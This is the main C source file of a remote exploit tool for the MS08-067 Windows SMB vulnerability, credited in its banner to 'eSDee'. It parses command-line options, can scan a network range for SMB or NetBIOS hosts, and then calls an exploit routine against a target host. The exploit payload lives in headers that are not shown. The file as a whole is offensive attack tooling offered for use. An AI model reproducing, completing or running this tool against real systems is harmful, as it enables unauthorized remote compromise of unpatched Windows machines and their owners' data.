#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>

#include "session.h"

#include "main.h"
#include "ansi.h"
#include "exploit_ms0867.h"
#include "mode.h"
#include "scan.h"
#include "smb_funct.h"
#include "wrapper.h"

void
banner()
{
        fprintf(stdout, GR"["LG"!"GR"]" LG" ms08-067 remote exploit"DG" by eSDee(esdee@promisc.org)\r\n"NO);
        fflush(stdout);

        return;
}

void
display_usage(const char *program_name)
{
        fprintf(stderr, "Usage: %s [-dinpPv] [host|network]                          \r\n\r\n"
                        "-d <device>            Scanning device. (default: eth0)         \r\n"
                        "-i                     Gather information and exit.             \r\n"
                        "-n                     Use NBT (port 139)                       \r\n"
                        "-p <Port>              Use an arbitrary port.                   \r\n"
                        "-s <Type>              Scanning mode. Use type: NBT or SMB.     \r\n"
                        "-v                     Verbose mode.                            \r\n"
                        "\r\n", 
                        
                        program_name);
        fflush(stderr);

        exit(EXIT_FAILURE);
}

void
parse_options(struct SMB_session *session, int argc, char *argv[])
{
        char scan_opt[1024];

        int i   = 0;
        int opt = 0;

        time_out                = DEFAULT_TIMEOUT;

        memset(session, '\0', sizeof(struct SMB_session));
        
        session->device = xstrdup(DEFAULT_DEVICE);

        while((opt = getopt(argc, argv, "d:inp:u:s:v"))!= EOF) {

                switch(opt) {

                        case 'd':
                                session->device = xstrdup(optarg);
                                break;

                        case 'i':
                                SET_MODE(MODE_INFO);
                                break;

                        case 'n':
                                SET_MODE(MODE_NBT);
                                break;

                        case 'p':
                                SET_MODE(MODE_MANUAL_PORT);

                                session->port = atoi(optarg);

                                if ((session->port < 0) || (session->port > 65535)) {
                                        fprintf(stderr, "%s: Invalid port.\r\n", argv[0] == NULL ? NAME : argv[0]);
                                        exit(EXIT_FAILURE);
                                }

                                break;

                        case 's':
                                SET_MODE(MODE_SCAN);

                                memset(scan_opt, '\0', sizeof(scan_opt));
                                strncpy(scan_opt, optarg, sizeof(scan_opt) - 1);

                                for (i = 0; i < strlen(scan_opt); i++)
                                        *(scan_opt + i) = toupper(*(scan_opt + i));

                                if (!strncmp(scan_opt, "SMB", 3)) {
                                        SET_MODE(MODE_SMB);
                                } else if (!strncmp(scan_opt, "NBT", 3)) {
                                        SET_MODE(MODE_NBT);
                                } else {
                                        fprintf(stderr, "%s: Invalid scan option\r\n"
                                                        "Use -s NBT or SMB\r\n", NAME);
                                        exit(EXIT_FAILURE);
                                }

                                break;


                        case 'v':
                                SET_MODE(MODE_VERBOSE);
                                break;

                        default:
                                display_usage(argv[0] == NULL ? NAME : argv[0]);
                }
        }

        if (!argv[optind]) 
                display_usage(argv[0] == NULL ? NAME : argv[0]);

        session->hostname = xstrdup(argv[optind]);

        return;
}

int
main(int argc, char *argv[])
{
        struct SMB_session session;

        unsigned char *network  = NULL;
        unsigned char *mask     = NULL;

        banner();

        parse_options(&session, argc, argv);

        if (!MODE_IS_SET(MODE_NBT)) 
                SET_MODE(MODE_SMB);      

        if (MODE_IS_SET(MODE_SCAN)) {

                if ((network = strtok(argv[optind], "/")) == NULL) {
                        fprintf(stderr, "%s: Invalid network/cidr.\r\n", argv[0] == NULL ? NAME : argv[0]);
                        exit(EXIT_FAILURE);
                }

                if ((mask = strtok(NULL, "/")) == NULL) {
                        fprintf(stderr, "%s: Invalid network/cidr.\r\n", argv[0] == NULL ? NAME : argv[0]);
                        exit(EXIT_FAILURE);
                }

                SMB_scan_network(&session, network, atoi(mask));
                exit(EXIT_SUCCESS);
        }

        exploit_ms0867(&session);

        SMB_free_session(&session);

        return 0;
}
